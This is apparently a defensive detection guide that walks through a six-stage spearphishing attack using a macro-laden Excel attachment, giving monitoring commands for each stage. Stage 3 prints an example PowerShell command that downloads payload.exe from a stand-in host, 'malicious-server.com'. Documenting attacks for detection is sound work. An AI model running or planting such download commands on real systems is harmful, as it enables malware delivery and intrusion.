Pattern Name: Spearphishing Attachment

Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment designed to exploit a vulnerability in Microsoft Excel. The attack progresses from the initial email interaction to the execution of a payload that establishes a foothold in the victim's environment.

Attack Flow Breakdown:

**Stage 1: Initial Access via Email**
- **Applications Involved**: Outlook
- **User Action**: The user receives an email with a subject line "Important Document" and an attachment named "Invoice.xlsx".
- **Key Artifacts**: Email headers, attachment file "Invoice.xlsx".
- **Detection Focus**: Monitor for emails with suspicious attachments, especially those with common file types like .xlsx.

```shell
# Example of a suspicious email log entry
grep "Important Document" /var/log/mail.log
```

**Stage 2: Opening the Malicious Attachment**
- **Applications Involved**: Outlook, Excel
- **User Action**: The user opens the attachment in Excel, triggering the execution of embedded macros.
- **Key Artifacts**: Excel file "Invoice.xlsx" with macros, Windows Event Log entries indicating Excel execution.
- **Detection Focus**: Monitor for Excel files that contain macros and are opened from email clients.

```shell
# Example of monitoring for macro execution in Excel
Get-WinEvent -LogName "Microsoft-Windows-Security-Auditing" | Where-Object { $_.Message -like "*Excel*" -and $_.Message -like "*macro*" }
```

**Stage 3: Macro Execution and Payload Download**
- **Applications Involved**: Excel, PowerShell
- **User Action**: The macro executes a PowerShell command to download a malicious payload from a remote server.
- **Key Artifacts**: PowerShell command execution logs, network traffic to the attacker's server (e.g., `http://malicious-server.com/payload.exe`).
- **Detection Focus**: Monitor for PowerShell commands executed from Excel and any outbound connections to known malicious domains.

```shell
# Example of a PowerShell command executed by the macro
powershell -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile 'C:\Users\Victim\Downloads\payload.exe'"
```

**Stage 4: Execution of the Malicious Payload**
- **Applications Involved**: Explorer, payload executable
- **User Action**: The downloaded payload is executed, establishing a reverse shell back to the attacker.
- **Key Artifacts**: Execution of "payload.exe", network connections to the attacker's command and control server.
- **Detection Focus**: Monitor for execution of newly downloaded executables and any unusual outbound connections.

```shell
# Example of monitoring for new executable execution
Get-Process | Where-Object { $_.Path -like "*Downloads*" -and $_.Name -eq "payload.exe" }
```

**Stage 5: Establishing Persistence**
- **Applications Involved**: Windows Task Scheduler, Explorer
- **User Action**: The payload creates a scheduled task to ensure persistence on the system.
- **Key Artifacts**: Scheduled task entries, logs indicating task creation.
- **Detection Focus**: Monitor for new scheduled tasks created by unknown executables.

```shell
# Example of checking for new scheduled tasks
schtasks /query /fo LIST | findstr "TaskName"
```

**Stage 6: Data Exfiltration**
- **Applications Involved**: Explorer, network services
- **User Action**: The attacker uses the established connection to exfiltrate sensitive data from the victim's machine.
- **Key Artifacts**: Network traffic logs showing data being sent to the attacker's server.
- **Detection Focus**: Monitor for large outbound data transfers, especially to known malicious IP addresses.

```shell
# Example of monitoring for unusual outbound traffic
tcpdump -i eth0 'dst host malicious-server.com'
```
